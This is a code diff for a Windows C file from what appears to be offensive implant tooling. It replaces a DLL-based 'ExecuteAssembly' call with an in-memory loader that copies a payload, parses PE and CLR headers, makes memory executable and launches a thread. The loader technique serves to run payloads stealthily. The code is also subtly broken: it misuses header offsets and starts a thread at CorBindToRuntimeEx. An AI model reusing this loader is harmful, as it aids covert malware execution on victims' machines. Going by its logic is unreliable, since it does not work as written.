@@ -1,25 +1,39 @@
 #include <windows.h>
 #include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
 
-typedef void* (*ExecuteFunc)(unsigned char*, int, const char**, int);
+void execute(BYTE* payload, int payloadLength)
+{
+    int rva = 0;
+    IMAGE_DOS_HEADER* dosHeader;
+    IMAGE_NT_HEADERS* ntHeaders;
+    IMAGE_SECTION_HEADER* sectionHeader;
+    IMAGE_COR20_HEADER* clrHeader;
+    DWORD oldProtect, newProtect;
+    BYTE* baseAddress;
+    BYTE* assemblyAddress;
+    DWORD assemblySize;
+    HANDLE hThread;
+    DWORD threadId;
+    DWORD* funcAddress;
 
-int ExecuteAssembly(unsigned char** asmBytes, char* args) {
-    HMODULE hMod = LoadLibrary("..\\..\\..\\ImplantModulesCS\\bin\\Release\\ImplantModulesCS.dll");
-    if (hMod == NULL) {
-        printf("Could not load the dynamic library\n");
-        return EXIT_FAILURE;
-    }
+    baseAddress = VirtualAlloc(0, payloadLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    memcpy(baseAddress, payload, payloadLength);
 
-    ExecuteFunc execute = (ExecuteFunc)GetProcAddress(hMod, "Execute");
-    if (execute == NULL) {
-        printf("Could not locate the function\n");
-        return EXIT_FAILURE;
-    }
+    dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
+    ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)baseAddress + dosHeader->e_lfanew);
+    sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
+    clrHeader = (IMAGE_COR20_HEADER*)((BYTE*)baseAddress + ntHeaders->OptionalHeader.DataDirectory[14].VirtualAddress);
 
-    char* result = execute(asmBytes, sizeof(asmBytes), args, sizeof(args));
+    assemblyAddress = (BYTE*)baseAddress + clrHeader->ManagedNativeHeader.VirtualAddress;
+    assemblySize = clrHeader->ManagedNativeHeader.Size;
 
-    printf("Result: %s\n", result);
-
-    FreeLibrary(hMod);
-    return 0;
+    VirtualProtect(assemblyAddress, assemblySize, PAGE_EXECUTE_READWRITE, &oldProtect);
+    funcAddress = (DWORD*)GetProcAddress(GetModuleHandle("mscoree.dll"), "CorBindToRuntimeEx");
+    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)funcAddress, assemblyAddress, 0, &threadId);
+    WaitForSingleObject(hThread, INFINITE);
+    VirtualProtect(assemblyAddress, assemblySize, oldProtect, &newProtect);
+    VirtualFree(baseAddress, 0, MEM_RELEASE);
 }
+
